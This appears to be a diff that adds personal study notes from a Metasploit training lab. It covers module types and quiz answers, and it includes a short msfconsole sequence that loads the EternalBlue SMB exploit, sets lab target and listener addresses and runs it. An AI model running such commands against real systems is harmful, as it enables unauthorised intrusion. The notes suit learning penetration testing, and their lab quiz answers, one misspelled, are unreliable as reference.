@@ -1,0 +1,71 @@
+Exploit: A piece of code that uses a vulnerability present on the target system.
+Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
+Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.
+
+Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
+Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
+Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
+Exploits, neatly organized by target system.
+NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
+Payloads are codes that will run on the target system. You will see three different directories under payloads:
+Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
+Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
+Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
+Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
+
+What is the name of the code taking advantage of a flaw on the target system? exploid
+
+What is the name of the code that runs on the target system to achieve the attacker's goal? payload
+
+What are self-contained payloads called? singles
+
+Is "windows/x64/pingback_reverse_tcp" among singles or staged payload? singles
+
+Msfconsole is managed by context; this means that if you change an active exploit all settings will be lost.
+
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+show payloads
+info
+back
+
+Rankings:
+Excellent: never crashes the service: SQLI, CMD execution
+Great: has default target and auto-detects target
+Good: Exploit has default target and is common case for this target
+Normal: Reliable depending on target and doesn't autodetct well
+Average: unreliable or difficult to exploit
+Low: nearly impossible to exploit
+Manual: unstable
+
+
+How would you search for a module related to Apache? search apache
+
+
+Who provided the auxiliary/scanner/ssh/ssh_login module? info auxiliary/scanner/ssh/ssh_login
+
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set rhost 10.10.56.68
+show options
+//setg is used to set globaly
+unset all
+back
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+setg rhosts 10.10.56.68
+show options
+back
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set lhost 10.18.25.222 //fix exploit fail
+exploit -z //-z = no parameters
+
+How would you set the LPORT value to 6666? set LPORT 6666
+
+How would you set the global value for RHOSTS  to 10.10.19.23 ? setg RHOSTS 10.10.19.23
+
+What command would you use to clear a set payload? unset payload
+
+What command do you use to proceed with the exploitation phase? exploit
